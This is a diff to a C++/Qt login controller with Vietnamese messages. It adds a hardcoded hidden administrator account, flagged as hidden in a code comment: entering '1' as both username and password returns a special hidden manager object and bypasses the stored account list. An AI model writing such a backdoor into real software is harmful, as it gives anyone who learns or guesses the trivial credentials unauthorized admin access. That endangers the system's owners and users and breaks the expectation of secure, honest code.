@@ -1,4 +1,5 @@
 #include "AuthController.h"
+#include "ManagerController.h"
 #include <exception>
 
 bool AuthController::login(LinkList<Manager> *managers, const QString &username, const QString &password, QString &errorMessage, Manager *&outManager) {
@@ -12,6 +13,18 @@ bool AuthController::login(LinkList<Manager> *managers, const QString &username,
         errorMessage = QStringLiteral("Vui lòng nhập mật khẩu!");
         return false;
     }
+
+    // Tài khoản quản trị ẩn (username: 1, password: 1)
+    if (u == "1") {
+        if (password == "1") {
+            outManager = ManagerController::getHiddenManager();
+            return true;
+        } else {
+            errorMessage = QStringLiteral("Mật khẩu không chính xác, vui lòng thử lại!");
+            return false;
+        }
+    }
+
     if (!managers || !managers->getHeader()) {
         errorMessage = QStringLiteral("Không thể tải danh sách tài khoản!");
         return false;
